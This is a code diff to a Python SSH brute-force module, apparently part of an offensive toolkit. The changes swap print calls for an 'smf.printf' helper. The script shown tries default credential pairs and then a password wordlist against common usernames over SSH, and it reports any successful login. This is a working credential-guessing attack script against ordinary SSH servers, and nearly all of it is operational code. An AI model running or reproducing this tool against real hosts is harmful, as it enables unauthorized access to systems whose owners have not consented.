@@ -1,6 +1,7 @@
 import paramiko
 import time
 import os
+import smf
 from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
 from apps.utility.colors import C
 
@@ -51,20 +52,20 @@ def execute(options):
     wordlist_path = options.get("PASS")
 
     port = 22
-    print(f"{C.HEADER}  --- SSH BRUTE FORCE: {target_ip} ---")
+    smf.printf(f"{C.HEADER}  --- SSH BRUTE FORCE: {target_ip} ---")
 
     try:
         # Stage 1: Kredensial Default
-        print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
+        smf.printf(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
         for user, passwd in DEFAULT_CREDS:
             if test_ssh(target_ip, port, user, passwd):
-                print(f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{user} P:{passwd}")
+                smf.printf(f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                 return
-            print(f"{C.MENU}  [-] Fail: {user}:{passwd}")
+            smf.printf(f"{C.MENU}  [-] Fail: {user}:{passwd}")
 
         # Stage 2: Wordlist
         if wordlist_path and os.path.exists(wordlist_path):
-            print(f"\n{C.MENU}  [*] Starting stage 2: Wordlist...")
+            smf.printf(f"\n{C.MENU}  [*] Starting stage 2: Wordlist...")
             with open(wordlist_path, "r", encoding="latin-1") as f:
                 for target_user in COMMON_USERS:
                     f.seek(0)
@@ -73,11 +74,11 @@ def execute(options):
                         if not passwd:
                             continue
                         if test_ssh(target_ip, port, target_user, passwd):
-                            print(
+                            smf.printf(
                                 f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{target_user} P:{passwd}"
                             )
                             return
-                        print(
+                        smf.printf(
                             f"{C.MENU}  [>] Try: U:{target_user:<20} P:{passwd:<20}",
                             end="\r",
                             flush=True,
@@ -86,4 +87,4 @@ def execute(options):
     except KeyboardInterrupt:
         return
     except Exception as e:
-        print("{C.ERROR}[x] ERROR: {e}")
+        smf.printf("{C.ERROR}[x] ERROR =>", e)
